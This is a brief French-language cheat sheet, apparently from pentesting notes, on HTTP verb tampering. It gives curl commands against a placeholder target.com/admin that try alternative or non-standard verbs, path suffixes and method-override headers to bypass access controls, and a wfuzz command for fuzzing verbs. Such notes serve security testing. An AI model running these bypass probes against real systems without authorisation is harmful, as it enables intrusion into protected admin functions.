## Méthodes HTTP Courantes

```bash
GET     # Récupération de ressources
POST    # Envoi de données au serveur
PUT     # Modification/ajout de ressources
DELETE  # Suppression de ressources
PATCH   # Modification partielle de ressources
OPTIONS # Demande des méthodes supportées
HEAD    # Récupération des en-têtes seulement
TRACE   # Debugging
```

## Contournement des Restrictions d'Accès

```bash
# Tester des verbes alternatifs
curl -X PUT http://target.com/admin
curl -X DELETE http://target.com/user/1

# Ajouter des suffixes ou des paramètres
curl -X GET http://target.com/admin/; 
curl -X GET http://target.com/admin?method=DELETE

# Tester des variations non standards
curl -X MOVE http://target.com/admin
curl -X COPY http://target.com/admin
```

## Bypass via Headers HTTP

```bash
# Spécifier manuellement la méthode HTTP dans un en-tête
curl -X GET http://target.com/admin -H "X-HTTP-Method: DELETE"
curl -X GET http://target.com/admin -H "X-HTTP-Method-Override: PUT"
curl -X GET http://target.com/admin -H "X-Original-Method: POST"
```

## Outils Utiles

```bash
# Intercepter et modifier les requêtes HTTP
Burp Suite
Postman
MITMProxy

# Fuzzing des verbes HTTP
wfuzz -c -z list,GET-POST-PUT-DELETE-OPTIONS http://target.com/admin/FUZZ
```